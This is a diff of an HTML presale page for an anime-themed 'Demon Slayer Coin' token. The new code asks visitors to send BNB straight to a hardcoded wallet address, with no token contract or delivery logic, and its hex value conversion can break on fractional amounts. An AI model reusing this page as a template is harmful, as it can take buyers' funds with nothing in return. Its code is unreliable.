@@ -1,155 +1,157 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Demon Slayer Coin (DSC) - Presale</title>
+  <meta charset="UTF-8">
+  <title>Demon Slayer Coin (DSC)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {
-      background: linear-gradient(#000000, #1a1a1a);
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
+    * {
       margin: 0;
       padding: 0;
-      text-align: center;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Arial', sans-serif;
+      color: #fff;
+    }
+
+    /* فيديو الخلفية */
+    #bg-video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -2;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      filter: brightness(0.4);
+    }
+
+    /* غطاء خفيف لتظليل الخلفية */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: -1;
     }
 
     .container {
-      max-width: 600px;
-      margin: auto;
-      padding: 40px 20px;
+      text-align: center;
+      padding-top: 140px;
     }
 
     h1 {
-      color: red;
-      font-size: 36px;
-    }
-
-    .description {
-      font-size: 16px;
-      margin-bottom: 30px;
-      color: #ccc;
+      font-size: 3em;
+      margin-bottom: 20px;
+      color: #ff4444;
+      text-shadow: 0 0 10px red;
     }
 
     .info {
-      font-size: 18px;
-      margin-bottom: 20px;
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 25px;
+      border-radius: 15px;
+      display: inline-block;
     }
 
-    #countdown {
-      font-size: 22px;
-      color: #00ffcc;
-      margin-bottom: 30px;
-    }
-
-    .btn {
-      background: red;
-      color: white;
-      padding: 14px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
+    .info p {
       margin: 10px 0;
+      font-size: 1.2em;
     }
 
-    .btn:hover {
-      background: darkred;
-    }
-
-    .contract-box {
-      background: #222;
-      border: 1px solid #555;
-      padding: 10px;
-      border-radius: 6px;
-      margin-top: 20px;
-    }
-
-    .copy-btn {
-      background: #444;
+    button {
+      background-color: #ff0000;
       color: #fff;
+      font-size: 1.2em;
+      padding: 12px 25px;
+      margin-top: 15px;
       border: none;
-      padding: 8px 16px;
-      border-radius: 6px;
+      border-radius: 10px;
       cursor: pointer;
-      margin-top: 10px;
+      transition: 0.3s ease;
     }
 
-    .copy-btn:hover {
-      background: #666;
+    button:hover {
+      background-color: #cc0000;
+      transform: scale(1.05);
+    }
+
+    footer {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      color: #ccc;
+      font-size: 0.9em;
     }
   </style>
 </head>
 <body>
+
+  <!-- خلفية فيديو -->
+  <video id="bg-video" autoplay muted loop>
+    <source src="https://cdn.cloudflare.steamstatic.com/steam/apps/256871487/movie480_vp9.webm" type="video/webm">
+    Your browser does not support HTML5 video.
+  </video>
+
+  <!-- صوت خلفي -->
+  <audio autoplay loop>
+    <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_995f4e6e04.mp3" type="audio/mp3">
+  </audio>
+
+  <div class="overlay"></div>
+
   <div class="container">
     <h1>Demon Slayer Coin (DSC)</h1>
-    <p class="description">
-      Join the exclusive presale of DSC – the anime-inspired token on BNB Chain 🔥<br>
-      Inspired by Demon Slayer. Limited-time only.
-    </p>
-
     <div class="info">
-      💰 Price: <b>0.0000016 BNB</b> per DSC<br>
-      🪙 Total Supply: <b>1,000,000,000</b><br>
-      🚀 Presale Supply: <b>500,000,000</b>
+      <p>💰 Price: 0.00000727 BNB per DSC</p>
+      <p>🔄 Total Supply: 1,000,000,000</p>
+      <p>🔥 Presale Supply: 500,000,000</p>
+      <button onclick="buyToken()">Buy Now with MetaMask</button>
     </div>
-
-    <div id="countdown">Loading countdown...</div>
-
-    <button class="btn" onclick="connectWallet()">Buy Now with MetaMask</button>
-
-    <div class="contract-box">
-      <div>📄 Contract Address:</div>
-      <div id="contract">0x2106b5C4A249cAc7e27b7BE165517b43a00b290a</div>
-      <button class="copy-btn" onclick="copyContract()">Copy Address</button>
-    </div>
-
-    <p style="margin-top: 50px; font-size: 12px; color: gray;">
-      © 2025 Demon Slayer Coin. All rights reserved.
-    </p>
   </div>
 
+  <footer>© 2025 Demon Slayer Coin. All rights reserved.</footer>
+
   <script>
-    const endDate = new Date("2025-08-10T23:59:59").getTime();
+    async function buyToken() {
+      const amount = prompt("Enter amount of DSC you want to buy:");
+      if (!amount) return;
 
-    function updateCountdown() {
-      const now = new Date().getTime();
-      const timeLeft = endDate - now;
+      const pricePerToken = 0.00000727;
+      const totalBNB = amount * pricePerToken;
 
-      if (timeLeft < 0) {
-        document.getElementById("countdown").innerHTML = "⛔ Presale Ended";
-        return;
-      }
-
-      const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
-      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
-
-      document.getElementById("countdown").innerHTML =
-        `⏳ ${days}d ${hours}h ${minutes}m ${seconds}s remaining`;
-    }
-
-    setInterval(updateCountdown, 1000);
-
-    function copyContract() {
-      const text = document.getElementById("contract").textContent;
-      navigator.clipboard.writeText(text);
-      alert("Contract copied to clipboard ✅");
-    }
-
-    async function connectWallet() {
-      if (typeof window.ethereum !== "undefined") {
+      if (typeof window.ethereum !== 'undefined') {
         try {
-          await ethereum.request({ method: "eth_requestAccounts" });
-          alert("MetaMask connected ✅");
-        } catch (error) {
-          alert("Connection rejected ❌");
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          const from = accounts[0];
+          const to = '0x2106b5C4A249cAc7e27b7BE165517b43a00b290a';
+          const value = (totalBNB * 1e18).toString(16);
+
+          await ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from,
+              to,
+              value: '0x' + value,
+            }],
+          });
+
+          alert("Transaction sent!");
+        } catch (err) {
+          alert("Transaction failed: " + err.message);
         }
       } else {
-        alert("MetaMask not found! ❌");
+        alert("Please install MetaMask.");
       }
     }
   </script>
+
 </body>
 </html>
